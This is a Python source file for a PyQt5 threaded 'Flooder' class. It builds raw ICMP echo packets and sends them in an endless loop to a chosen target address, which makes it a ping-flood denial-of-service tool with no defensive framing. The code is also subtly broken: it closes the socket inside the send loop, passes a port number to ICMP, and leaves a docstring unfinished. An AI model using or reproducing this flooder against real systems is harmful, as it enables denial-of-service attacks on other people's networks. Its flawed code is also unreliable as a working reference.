from logging import warning, exception
from struct import pack, error as PackException
from time import time, sleep

from socket import (
    socket,
    htons,
    inet_aton,
    AF_INET,
    SOCK_RAW,
    IPPROTO_ICMP
)

from PyQt5 import QtCore
from PyQt5.QtCore import QThread


class Flooder(QThread):
    """
    This class extends PyQt5.QtCore.QThread class which provides ability to launch
    run( method ) into own thread. This class build ICMP packet (header + body)
    and send to specified address:port.

    :argument:
        address (str):
            The target ip-address to send ICMP-packets.
        port_number (int):
            The target port number to send ICMP-packets.
        packet_length (int):
            The length of ICMP-packet body to send.
        sending_frequency (float):
            The frequency of ICMP-packet sending which provides to set timeout.

    :attributes:
        address (str):
            The target ip-address to send ICMP-packets.
        port_number (int):
            The target port number to send ICMP-packets.
        packet_length (int):
            The length of ICMP-packet body to send.
        sending_frequency (float):
            The frequency of ICMP-packet sending which provides to set timeout.

    :methods:
        _checksum(message) -> int:
            This static private method returns a sum of built ICMP-packet to check.
        _construct_packet(self):
            This method returns built ICMP-packet (header + body) to send it.
        def run(self) -> None:
            This method
    """
    finish_signal = QtCore.pyqtSignal()

    def __init__(self, address: str, port_number: int, packet_length: int, sending_frequency: float):
        QThread.__init__(self, None)

        self.address = address
        self.port_number = port_number
        self.packet_length = packet_length
        self.sending_frequency = sending_frequency

    @staticmethod
    def _checksum(message) -> int:
        """
        This method returns the summary byte length of built ICMP-packet.

        :argument:
            message (bytes):
                The byte array of ICMP-packet (header + body).

        :returns:
            int: The summary byte length.
        """

        summary = 0
        for index in range(0, len(message), 2):
            w = message[index] + (message[index + 1] << 8)
            summary = ((summary + w) & 0xffff) + ((summary + w) >> 16)
        return htons(~summary & 0xffff)

    def _construct_packet(self) -> bytes:
        """
        This method returns bytes of IMCP-packet (header + body).

        :return:
            bytes: The summary bytes of ICMP-packet.
        """

        header = pack("bbHHh", 8, 0, 0, 1, 1)
        data_fmt = (self.packet_length - 50) * 'Q'
        data = pack("d", time()) + data_fmt.encode('ascii')
        header = pack("bbHHh", 8, 0, htons(self._checksum(header + data)), 1, 1)
        return header + data

    def run(self):
        """
        This method runs with another thread to create ICMP-packet and send it
        to specified target ip-address.

        :raise:
            error:
                throws while invoke pack() method failed.
            KeyboardInterrupt:
                throws while user send SIGKILL or SIGINT signal to stop
                all threads whose sending packets.
        """

        try:
            sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
            inet_aton(self.address)

            while True:
                packet = self._construct_packet()
                sock.sendto(packet, (self.address, self.port_number))
                sleep(self.sending_frequency)
                sock.close()

        except PackException as err:
            exception(msg=f'Failed while trying pack msg: {err}')

        except (KeyboardInterrupt, SystemExit) as err:
            warning(msg=f'Has been interrupted closing event. Closing all available threads: {err}')

        finally:
            self.finish_signal.emit()
